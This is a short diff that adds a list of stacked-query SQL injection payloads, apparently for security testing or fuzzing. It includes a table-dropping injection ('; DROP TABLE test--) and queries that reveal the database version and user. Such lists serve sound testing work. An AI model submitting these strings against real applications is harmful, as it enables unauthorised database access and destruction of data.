@@ -1,0 +1,5 @@
+# Stacked queries payloads
+'; DROP TABLE test--
+'; SELECT 1--
+'; SELECT @@version--
+'; SELECT user()--
